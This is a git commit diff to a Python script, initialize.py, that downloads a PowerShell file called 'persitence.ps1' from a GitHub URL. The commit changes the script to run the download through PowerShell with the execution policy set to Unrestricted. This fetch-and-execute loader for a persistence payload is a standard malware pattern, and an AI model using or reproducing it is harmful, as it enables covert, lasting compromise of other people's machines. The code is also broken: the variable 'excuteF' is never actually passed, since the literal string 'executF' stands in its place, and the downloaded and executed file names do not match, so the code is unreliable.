69aff21ff2b31ad2e42aee72e6c41827b7b7a878
Acrasy <sai.whocares@gmail.com>
2019-10-10 13:39:50 +0200

    added subprocess functionality

--- codesamples/initialize/code/initialize.py
+++ codesamples/initialize/code/initialize.py
@@ -7,4 +7,5 @@ os.mkdir(cwd)
 os.chdir(cwd)
 wget.download('https://raw.githubusercontent.com/Acrasy/samples/master/codesamples/initialize/code/persitence.ps1')
 
-subprocess.call([r'.\persistence.ps1'])
+excuteF=os.path.join(cwd,"powershell.exe")
+psexectaskscheduler = subprocess.Popen([r'executF','-ExecutionPolicy','Unrestricted','./persistence.ps1'])
